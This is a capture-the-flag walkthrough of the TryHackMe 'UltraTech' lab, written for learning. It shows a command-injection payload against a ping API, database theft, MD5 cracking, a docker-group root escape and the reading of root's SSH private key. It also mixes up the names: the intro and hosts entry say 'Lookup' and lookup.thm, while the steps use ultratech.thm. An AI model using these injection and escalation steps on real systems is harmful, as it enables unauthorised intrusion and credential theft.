# UltraTech Walkthrough
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/ultratech1) on TryHackMe.

Here is the storyline:
```
~_. UltraTech ._~

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.


[ Your Mission ]
You have been contracted by UltraTech to pentest their infrastructure.
It is a grey-box kind of assessment, the only information you have
is the company's name and their server's IP address.

Good luck and more importantly, have fun!

Lp1 <fenrir.pro>
```

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP lookup.thm" | sudo tee -a /etc/hosts
```

nmap scan:
```bash
sudo nmap -sN -sC -p- lookup.thm
```

We find the following open ports:
```
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp open|filtered blackice-icecap
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Le'ts try to visit `http://ultratech.thm:8081/`, we find the UltraTech API + Wappalizer found that REDACTED is running.

We can now take a look at `http://ultratech.thm:31331`, here we can find the Ultratech website.
Checking the `robots.txt` file we can find the sitemap at `/utech_sitemap.txt`
```
/
/index.html
/what.html
/partners.html
```

Visiting the partners page `http://ultratech.thm:31331/partners.html`, we can find a login form.
In the page source code we see a call to a JS script:
```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

This is used to interact with the API at the `/auth` endpoint, we can also spot the `/ping` endpoints there.


> [!NOTE] Note
> You could have gotten this 2 endpoints simply by scanning the API with something like : `gobuster dir -u http://ultratech.thm:8081/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64  --exclude-length 27
`

What this JS script does is:
1. Get the  API url
2. Send a `GET` request to the `/ping` API endpoint to check if it is running or not, this will either display an error or "The api seems to be running".
3. Finally takes the data you input in the form and sent it to the `/auth` API endpoint.

If we try to capture the login request with Burp Suite Proxy we can see that our data gets passed as URL parameters:
```http
GET /auth?login=test&password=pass  HTTP/1.1
Host: ultratech.thm:8081
```

Sending this request will then print us the error "Invalid credentials".

Let's take a quick look at what we get by interacting with the other endpoint: `http://ultratech.thm:8081/ping`.
This is more interesting, we get a verbose error:
```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

Interestingly if i try to pass the `ip` parameter in the URL:
```
http://ultratech.thm:8081/ping?ip=10.9.0.100
```

It will ping my machine:
```
PING 10.9.0.100 (10.9.0.100) 56(84) bytes of data. 64 bytes from 10.9.0.100: icmp_seq=1 ttl=63 time=57.1 ms --- 10.9.0.100 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 57.184/57.184/57.184/0.000 ms
```

Let' try to test sending some payloads, after a couple of error i started to think about what could be the command that was run on the server, and i ended up with this syntax idea:
```
ping [OPTION] 'USER INPUT'
```

Further error revealed:
```bash
ping6 -c1 'USER INPUT'
```

Here we have to escape the backthiks, commonly can achieve it with commands like `&&` , `;`, using more thiks and so on, we need to test some combinations...

Finally inserting the new line character `%0A` did the trick:
```
http://ultratech.thm:8081/ping?ip=localhost%0Awhoami
```

Now let's try to run `ls` to see what's in the current working directory, the output revealed 6 files:
```
 index.js 
 node_modules 
 package.json 
 package-lock.json 
 start.sh 
 utech.db.sqlite
```

We need to download that database file, let's start an HTTP server passing the command:
```
python3%20-m%20http.server
```

Now we can download it from our machine:
```bash
wget http://ultratech.thm:8000/utech.db.sqlite 
```

Open the database:
```bash
sqlite3 utech.db.sqlite 
```

Now list tables:
```
.tables
```

We find the "users" table, dump the content:
```sql
SELECT * from users;
```

```
REDACTED_HASHES
```

Time to check the hash format and crack it:
```bash
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
```
--> REDACTED -> r00t
--> REDACTED -> admin

With this credentials we can authenticate:
```
http://ultratech.thm:8081/auth?login=r00t&password=n100906
```

And we see a message from the user "lp1":
```
Hey r00t, can you please have a look at the server's configuration?  
The intern did it and I don't really trust him.  
Thanks!  
  
_lp1_
```

Now let's login via SSH:
```bash
ssh r00t@ultratech.thm
```

Supply that password when prompted.

<br/>

### Privilege Escalation
Checking sudo permissions:
```bash
sudo -l
```

We cant run anything as `sudo`.

Further enumerations reveals that we are part of the "docker" group.
We can check for running containers:
```bash
docker ps
```

No one, list all containers and images:
```bash
docker ps --all
```

```bash
docker images ls
```

There are 3 containers:
```
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                     PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s…"   6 years ago         Exited (130) 6 years ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   6 years ago         Exited (127) 6 years ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   6 years ago         Exited (127) 6 years ago                       boring_volhard
```

We can use this command to try to gain a privileged shell:
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

It works, we got a shell as root, now we can get it's ssh key:
```bash
cat /root/.ssh/id_rsa
```

And it ends here, we have to submit some of the first chars of the key as the final answer.

<br/>
<br/>

## Conclusion
Congratulations you have successfully found app vulnearbility, compromised an SQL  database and hacked the root user via docker.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
